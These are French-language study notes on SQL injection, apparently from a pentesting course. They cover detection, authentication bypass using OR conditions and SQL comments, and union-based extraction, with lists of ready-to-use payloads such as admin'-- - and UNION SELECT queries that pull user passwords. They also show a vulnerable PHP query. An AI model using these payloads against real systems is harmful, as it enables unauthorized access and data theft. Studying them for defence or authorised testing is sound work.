# SQL Injections (SQLI)

## SQL en WebApp : contexte classique

- Les apps web utilisent SQL pour gérer les utilisateurs, posts, recherches, etc.
- L’input utilisateur est souvent inséré dans les requêtes SQL :
  - PHP/MySQL typique :
    ```php
    $searchInput = $_POST['findUser'];
    $query = "SELECT * FROM logins WHERE username LIKE '%$searchInput'";
    ```
- Danger : si l’input n’est pas filtré → **injection possible**.

## Types de SQLI (principaux)

- **In-band (Résultat visible directement)**  
- **Union-based** : récupération de données via UNION SELECT.
- **Error-based** : exploitation des messages d’erreur SQL renvoyés.

- **Blind (Résultat invisible, il faut deviner ou forcer le comportement)**  
- **Boolean-based** : test de conditions VRAI/FAUX pour extraire info (ex: page différente selon le résultat).
- **Time-based** : utilisation de SLEEP() pour détecter via délai (ex: page lente = requête vraie).

- **Out-of-band**  
- Exfiltration hors bande (DNS, HTTP, etc) – rare, utile si aucune sortie exploitable.

## Détection rapide SQLI

- **Tester :** `' " ) ( ; -- # /*`
- **Rechercher des erreurs SQL dans la réponse**
- **Vérifier si l’input ressort dans la page, ou si le comportement de la page change**
- **Injecter une condition toujours vraie** (`' OR 1=1 -- -`)  
- **Injecter une condition toujours fausse** (`' AND 1=2 -- -`)  

# SQLi Subverting Query Logic & Auth Bypass

## Objectif

- Modifier la logique d'une requête SQL pour bypass l’auth, obtenir accès, etc.
- S’appuyer sur l’**OR** et les **commentaires SQL** pour forcer une condition toujours vraie.

## Découverte de vulnérabilité

- **Injecter des caractères spéciaux dans le form** (username/password) pour détecter une erreur SQL :
    - `'`
    - `"`
    - `#`
    - `;`
    - `)`
- Si une **erreur SQL** apparaît : la requête est probablement vulnérable.

## Auth Bypass – Payloads classiques

### 1. Username ou Password, injection basique

`' or '1'='1`

- Permet de transformer la requête :
    ```
    SELECT * FROM logins WHERE username='<input>' OR '1'='1' AND password='<input>';
    ```
- La condition `'1'='1'` rend la requête toujours vraie.

### 2. Username + password = bypass total

- Username : `' or '1'='1`
- Password : `' or '1'='1`
- Résultat : accès sans username/pass valide.

### 3. Username only (si le champ password est ignoré par la logique)

- Username : `admin' -- `
- Password : (n’importe quoi)
- Requête résultante :
    ```
    SELECT * FROM logins WHERE username='admin' -- ' AND password='xxx';
    ```
- Le commentaire (`--`) annule le reste de la requête.

### 4. Utiliser les commentaires pour éviter les erreurs de syntaxe

- Ajouter : `-- -` ou `#` ou `/*` à la fin du payload pour commenter le reste.
- Exemples :
    - `admin' or '1'='1' -- -`
    - `' or 1=1#`
    - `" or ""="`

### 5. Auth bypass (sans user connu)

- Username : `' or 1=1 -- `
- Password : (n’importe quoi)
- Ou Username : ` ' OR TRUE -- - `
- Permet de bypasser même si aucun login n’est connu.

## Astuces pratiques

- **Toujours tester avec/et sans espaces, guillemets simples/doubles, commentaires.**
- Tester les deux champs (user et pass), certains sites ne vérifient pas les deux !
- Si l’app encode l'input, essayer la version encodée :
    - `'` = `%27`
    - `"` = `%22`
    - `#` = `%23`
- Si message d’erreur SQL : vulnérabilité probable !

## Liste de payloads à tester

- `' or '1'='1`
- `admin' -- `
- `admin' #`
- `admin'/*`
- `' or 1=1 -- -`
- `' or 1=1#`
- `" or ""="`
- `') or ('1'='1'--`
- `') or ('a'='a`
- `' or 1=1 limit 1 -- -`

# SQLi : Utilisation des commentaires

## Comments en SQL

- **Deux formats principaux sur MySQL** :
  - `-- ` (deux tirets + espace) → tout ce qui suit est ignoré
  - `#` (dièse) → tout ce qui suit est ignoré
  - `/* ... */` (inline/multi-ligne, rarement utile en injection simple)

## Auth Bypass : Payloads classiques avec commentaires

### Username : `admin'-- -`
- Requête résultante :

- `SELECT * FROM logins WHERE username='admin'-- ' AND password='xxx';`

- **Le reste de la requête (AND password...) est ignoré !**

### Version avec dièse (utile si espace mal filtré)

- Username : `admin'#`
- (En URL : `admin'%23`)

### Astuce : l’espace après `--`

- SQL attend toujours un espace après `--` pour activer le commentaire
- Si on injectes dans une URL, encoder l’espace : `--+` (car `+` = espace en URL)

### Pour balancer la parenthèse si besoin

- Quand la requête comporte des parenthèses, il faut parfois les fermer dans le payload :
  - Username : `admin')-- -`
  - Résultat :
      ```
      SELECT * FROM logins WHERE (username='admin')-- - ...`
      ```

## Récapitulatif des payloads utiles

- `admin'-- -`
- `admin'#`
- `admin')-- -`
- `admin')#`
- `' or '1'='1'-- -`
- `' or 1=1#`
- (En URL : remplacer `#` par `%23`, espace par `+`)

## Astuces pratiques

- **Tester avec espace, +, encodage URL, parenthèses fermées ou non**
- Pour GET : encode `#` en `%23` sinon le navigateur le gère comme ancre
- Toujours adapter au contexte SQL (regarde bien les parenthèses)
- Si erreur de syntaxe : ajuste le nombre de quotes ou de parenthèses

# CUnion Clause (Union-based Injection)

## Principe

L’injection UNION permet de fusionner le résultat d’une requête de l’appli avec tes propres requêtes SQL.
Permet de récupérer des données d’autres tables : users, passwords, emails…

### Syntaxe SQL Union
```
SELECT col1, col2 FROM table1
UNION
SELECT colA, colB FROM table2;
```
Les noms/nbre de colonnes et types de données doivent correspondre.

## Union-based Injection : Méthode pratique
### 1. Trouver le nombre de colonnes

  Tester différentes valeurs jusqu’à erreur :

   - `' ORDER BY 1-- -`

   - `' ORDER BY 2-- -`

   - `' ORDER BY 3-- -`

   (continuer jusqu’à erreur)

Dès qu’il y a une erreur : tu as trouvé le nombre max de colonnes affichées.

### 2. Trouver la structure correcte pour le UNION

  Injecter :

   - `' UNION SELECT 1-- -`

   - `' UNION SELECT 1,2-- -`

   - `' UNION SELECT 1,2,3-- -`

        ...jusqu’à voir la page s’afficher sans erreur.

  Quand la page s’affiche normalement, on a le bon nombre de colonnes.

### 3. Identifier la colonne affichée (reflected)

  Injecte des valeurs visibles :

   - `' UNION SELECT 111,222-- -`

   - `' UNION SELECT 111,'abc'-- -`

   Regarder sur la page si on vois “111” ou “abc”.

   Utiliser cette colonne pour afficher qu'on veux exfiltrer.

## Exemples de payloads Union-based

  - `' UNION SELECT 1,2-- -`

  - `' UNION SELECT username, password FROM users-- -`

  - `' UNION SELECT table_name, NULL FROM information_schema.tables-- -`

  - `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -`

  - `' UNION SELECT username, 2, 3 FROM users-- -`



## Ressources

- [PayloadAllTheThings – Authentication Bypass SQLI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md#authentication-bypass)


